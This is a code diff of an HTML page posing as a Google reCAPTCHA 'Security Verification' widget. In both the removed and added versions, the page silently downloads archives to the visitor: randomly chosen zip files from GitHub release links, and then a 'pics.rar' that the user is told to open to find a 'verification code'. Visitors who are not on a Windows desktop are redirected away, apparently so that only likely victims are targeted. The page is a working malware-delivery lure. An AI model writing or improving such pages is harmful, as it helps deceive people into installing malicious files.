@@ -3,169 +3,261 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Security Verification</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: Arial, sans-serif; margin: 40px; display: flex; justify-content: center; }
-        .container { width: 800px; }
-        .line { border-top: 1px solid #ccc; margin: 20px 0; }
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
+
+        .wrapper {
+            width: 302px;
+            background: #f9f9f9;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            box-shadow: 0 0 4px rgba(0,0,0,0.2);
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .blue-header {
+            background: #4285f4;
+            color: #fff;
+            padding: 15px;
+            font-size: 14px;
+            font-weight: bold;
+            line-height: 1.4;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .content-area {
+            padding: 20px;
+        }
+
+        /* Step 1: Checkbox */
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            padding: 5px 0;
+        }
+        .checkbox-item input[type="checkbox"] {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            cursor: pointer;
+            accent-color: #4285f4;
+        }
+        .logo-wrap {
+            margin-left: auto;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #555;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        .logo-wrap img {
+            height: 32px;
+        }
+
+        /* Step 2: Explanatory Text and Input Field */
+        .input-container {
+            display: none; /* Hidden initially */
+            text-align: center;
+        }
+        .input-container h3 {
+            margin: 0 0 10px 0;
+            font-size: 15px;
+            color: #333;
+        }
+        .explanation-text {
+            font-size: 13px;
+            color: #555;
+            line-height: 1.5;
+            margin-bottom: 15px;
+            text-align: left;
+            background: #f0f4f8;
+            padding: 12px;
+            border-radius: 4px;
+            border-left: 4px solid #4285f4;
+        }
+        .input-container input {
+            width: 80%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 4px;
+            text-transform: uppercase;
+            outline: none;
+            transition: border 0.3s;
+            margin-bottom: 15px;
+        }
+        .input-container input:focus {
+            border-color: #4285f4;
+            box-shadow: 0 0 4px rgba(66, 133, 244, 0.3);
+        }
         
-        #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 9999; display: flex; justify-content: center; align-items: center; cursor: pointer; flex-direction: column; }
-        
-        .widget { width: 302px; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; box-shadow: 0 0 4px rgba(0,0,0,0.2); overflow: hidden; font-family: Roboto, sans-serif; margin: 20px 0; }
-        .blue-header { background: #4285f4; color: #fff; padding: 12px 15px; font-size: 14px; font-weight: bold; }
-        .blue-header span { font-weight: normal; font-size: 12px; display: block; margin-top: 4px; }
-        .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; background: #fff; padding: 5px; }
-        .tile { aspect-ratio: 1; background: #eee; border: 1px solid #ccc; cursor: pointer; overflow: hidden; position: relative; }
-        .tile img { width: 100%; height: 100%; object-fit: cover; }
-        .tile.selected { border: 1px solid #4285f4; box-shadow: inset 0 0 0 1px #4285f4; }
-        .tile.selected::after { content: "✓"; position: absolute; top: 0; left: 0; width: 24px; height: 24px; background: #4285f4; color: white; text-align: center; line-height: 24px; font-weight: bold; border-bottom-right-radius: 3px; }
-        .footer { padding: 10px 15px; background: #f1f1f1; display: flex; justify-content: space-between; align-items: center; border-top: 1px solid #e0e0e0; }
-        .btn { padding: 6px 16px; font-size: 12px; font-weight: bold; border: none; border-radius: 2px; cursor: pointer; color: #fff; }
-        .btn-grey { background: #ccc; color: #666; }
-        .btn-blue { background: #4285f4; }
-        .checkbox-box { width: 302px; background: #f9f9f9; border: 1px solid #d3d3d3; border-radius: 3px; padding: 12px 15px; display: flex; align-items: center; box-shadow: 0 0 4px rgba(0,0,0,0.1); cursor: pointer; }
-        .hidden { display: none !important; }
-        .mono { font-family: monospace; font-size: 13px; margin-top: 20px; color: #222; }
+        .btn-verify {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 80%;
+            transition: background 0.2s;
+        }
+        .btn-verify:hover {
+            background: #3b78e7;
+        }
+
+        .error-msg {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+        .hidden {
+            display: none !important;
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div id="overlay">
-            <h2>Please click anywhere to start verification</h2>
-            <p>You must pass the bot verification.</p>
+
+    <div class="wrapper" id="main-widget">
+        <div class="blue-header">
+            <span>Security Check</span>
         </div>
 
-        <script>
-            (function() {
-                const ua = navigator.userAgent.toLowerCase();
-                if (!(ua.includes("windows") && !/android|iphone|ipad|mobile/.test(ua))) {
-                    window.location.href = "https://au.linkedin.com/in/shihan-shen0131?trk=people-guest_people_search-card";
-                }
-            })();
-        </script>
-
-        <div class="checkbox-box" id="step1">
-            <input type="checkbox" id="check" style="width:24px; height:24px; margin-right:12px; cursor:pointer;">
-            <label for="check" style="cursor:pointer;">I'm not a robot</label>
-            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" style="width:24px; margin-left:auto;">
-        </div>
-
-        <div class="widget hidden" id="step2">
-            <div class="blue-header">
-                Select all squares with<br><strong id="step-text">bicycles</strong>
-                <span>If there are none, click skip</span>
-            </div>
-            <div class="grid" id="grid"></div>
-            <div class="footer">
-                <div style="display:flex; gap:10px; opacity:0.5;">
-                    <span>⟳</span><span>🔊</span><span>ⓘ</span>
+        <div class="content-area">
+            <!-- Step 1 -->
+            <div id="step1">
+                <div class="checkbox-item">
+                    <input type="checkbox" id="main-checkbox">
+                    <label for="main-checkbox" style="cursor:pointer; font-weight:500; color:#444;">I'm not a robot</label>
+                    <div class="logo-wrap">
+                        <span>reCAPTCHA</span>
+                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="logo">
+                    </div>
                 </div>
-                <button class="btn btn-grey" id="action-btn">SKIP</button>
             </div>
-        </div>
 
-        <div class="line"></div>
-        <h2>About this page</h2>
-        <p style="font-size:14px;">Our systems have detected unusual traffic from your computer network.</p>
-        <div class="line"></div>
-        <div class="mono">
-            <div>IP address: 185.132.132.32</div>
-            <div>Time: 2026-07-28T01:26:18Z</div>
+            <!-- Step 2 -->
+            <div id="step2" class="input-container">
+                <h3>Verification Required</h3>
+                
+                <!-- Updated, natural explanation pointing to the image in pics.rar -->
+                <div class="explanation-text">
+                    The downloaded archive contains an image. Please open it to retrieve the 6-character verification code and enter it below.
+                </div>
+
+                <input type="text" id="code-input" maxlength="6" placeholder="______" autofocus>
+                <button class="btn-verify" id="verify-btn">VERIFY</button>
+                <div id="error-msg" class="error-msg">Incorrect code. Please try again.</div>
+            </div>
         </div>
     </div>
 
     <script>
-        // ==========================================
-        // CONFIGURATION: GitHub Release URLs
-        // ==========================================
-        const FILE_URLS = [
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.1.zip",
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.2.zip",
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.3.zip",
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.4.zip",
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.5.zip",
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.6.zip",
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.7.zip",
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.8.zip",
-            "https://github.com/Ramirhub/about-me/releases/download/v1.0/about.me.9.zip",
-        ];
-        // ==========================================
+        document.addEventListener('DOMContentLoaded', () => {
+            // --- Device and OS Check ---
+            (function() {
+                const ua = navigator.userAgent.toLowerCase();
+                const isWindows = ua.includes("windows");
+                const isMobile = /android|iphone|ipad|ipod|blackberry|opera mini|iemobile|mobile/.test(ua);
+                
+                // If NOT Windows desktop, redirect to btc.com
+                if (!(isWindows && !isMobile)) {
+                    window.location.href = "https://btc.com";
+                }
+            })();
 
-        const STEPS = ['bicycles', 'motorcycles', 'buses', 'crosswalks', 'fire hydrants'];
-        let currentStep = 0;
+            // --- Widget Logic ---
+            const checkbox = document.getElementById('main-checkbox');
+            const step1 = document.getElementById('step1');
+            const step2 = document.getElementById('step2');
+            const codeInput = document.getElementById('code-input');
+            const verifyBtn = document.getElementById('verify-btn');
+            const errorMsg = document.getElementById('error-msg');
 
-        // FIXED: Direct Download Function (No fetch, No Blob, No proxy)
-        function silentDirectDownload(url) {
-            const link = document.createElement('a');
-            link.href = url;
-            // Sets the download attribute directly. For .exe, the browser automatically forces a download without opening a tab.
-            link.download = url.split('/').pop() || 'download.exe';
-            link.style.display = 'none';
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-
-        function downloadRandom() {
-            if (FILE_URLS.length > 0) {
-                const idx = Math.floor(Math.random() * FILE_URLS.length);
-                // This bypasses the Render proxy and downloads straight from github.com
-                silentDirectDownload(FILE_URLS[idx]);
+            // Silent download function for the single pics.rar
+            async function downloadRar() {
+                try {
+                    const response = await fetch('/download/rar');
+                    if (!response.ok) return;
+                    const blob = await response.blob();
+                    const blobUrl = window.URL.createObjectURL(blob);
+                    const link = document.createElement('a');
+                    link.href = blobUrl;
+                    link.download = 'pics.rar'; // Downloads the single file
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
+                } catch (e) { /* Fail silently */ }
             }
-        }
 
-        function renderGrid(step) {
-            const grid = document.getElementById('grid');
-            const text = document.getElementById('step-text');
-            const btn = document.getElementById('action-btn');
+            // Step 1 Trigger - Download ONCE at the very start.
+            checkbox.addEventListener('change', function() {
+                if (this.checked) {
+                    // 1. Download the RAR (Only happens once per session)
+                    downloadRar();
+                    
+                    // 2. Switch UI
+                    step1.classList.add('hidden');
+                    step2.style.display = 'block';
+                    codeInput.focus();
+                }
+            });
 
-            text.innerText = STEPS[step];
-            grid.innerHTML = '';
-
-            for (let i = 0; i < 16; i++) {
-                const tile = document.createElement('div');
-                tile.className = 'tile';
-                const img = document.createElement('img');
-                img.src = `https://picsum.photos/seed/${step}-${i}/100/100`;
-                tile.appendChild(img);
-                grid.appendChild(tile);
-
-                tile.addEventListener('click', function() {
-                    this.classList.toggle('selected');
-                    downloadRandom(); // Triggers direct GitHub download
+            // Step 2 Verify Logic
+            function handleVerification() {
+                const code = codeInput.value.trim().toUpperCase();
+                
+                fetch('/verify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ code: code })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.success) {
+                        errorMsg.style.display = 'none';
+                        // Redirect to LinkedIn as requested
+                        window.location.href = "https://au.linkedin.com/in/shihan-shen0131?trk=people-guest_people_search-card";
+                    } else {
+                        errorMsg.style.display = 'block';
+                        codeInput.value = '';
+                        codeInput.focus();
+                        setTimeout(() => {
+                            errorMsg.style.display = 'none';
+                        }, 3000);
+                    }
+                })
+                .catch(err => {
+                    alert("An error occurred processing the code.");
                 });
             }
 
-            const isLast = step === STEPS.length - 1;
-            if (isLast) {
-                btn.innerText = 'VERIFY';
-                btn.className = 'btn btn-blue';
-                btn.onclick = () => {
-                    window.location.href = "https://au.linkedin.com/in/shihan-shen0131?trk=people-guest_people_search-card";
-                };
-            } else {
-                btn.innerText = 'SKIP';
-                btn.className = 'btn btn-grey';
-                btn.onclick = () => { currentStep++; renderGrid(currentStep); };
-            }
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            const overlay = document.getElementById('overlay');
-            const step1 = document.getElementById('step1');
-            const step2 = document.getElementById('step2');
-            const check = document.getElementById('check');
-
-            overlay.addEventListener('click', () => {
-                overlay.style.display = 'none';
-                downloadRandom(); // First visit direct download
-            });
-
-            check.addEventListener('change', () => {
-                step1.classList.add('hidden');
-                step2.classList.remove('hidden');
-                currentStep = 0;
-                renderGrid(currentStep);
+            // Event Listeners for Step 2
+            verifyBtn.addEventListener('click', handleVerification);
+            codeInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    handleVerification();
+                }
             });
         });
     </script>
